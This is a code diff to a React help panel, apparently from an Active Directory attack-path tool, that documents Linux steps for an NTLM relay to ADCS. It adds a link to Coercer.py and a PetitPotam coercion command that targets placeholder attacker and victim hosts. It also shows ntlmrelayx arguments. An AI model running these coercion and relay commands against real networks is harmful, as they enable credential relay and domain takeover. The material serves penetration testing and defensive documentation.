@@ -20,8 +20,9 @@ import { FC } from 'react';
 const LinuxAbuse: FC = () => {
     return (
         <>
+            <Typography variant={'body1'}>1. Start the Relay Server</Typography>
             <Typography variant={'body2'}>
-                1. Start the Relay Server The NTLM relay can be executed with{' '}
+                The NTLM relay can be executed with{' '}
                 <Link
                     target='_blank'
                     rel='noopener'
@@ -33,8 +34,9 @@ const LinuxAbuse: FC = () => {
             </Typography>
             <Typography component={'pre'}>{'--adcs --template <TEMPLATE_NAME>'}</Typography>
 
+            <Typography variant={'body1'}>2. Coerce the Target Computer</Typography>
             <Typography variant={'body2'}>
-                2. Coerce the Target Computer Several coercion methods are documented here:{' '}
+                Several coercion methods are documented here:{' '}
                 <Link
                     target='_blank'
                     rel='noopener'
@@ -43,6 +45,11 @@ const LinuxAbuse: FC = () => {
                 </Link>
                 . Examples of tools include:
                 <ul>
+                    <li>
+                        <Link target='_blank' rel='noopener' href='https://github.com/p0dalirius/Coercer'>
+                            Coercer.py
+                        </Link>
+                    </li>
                     <li>
                         <Link
                             target='_blank'
@@ -60,7 +67,10 @@ const LinuxAbuse: FC = () => {
             </Typography>
             <Typography variant={'body2'}>
                 To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
-                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>.
+                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
             </Typography>
         </>
     );
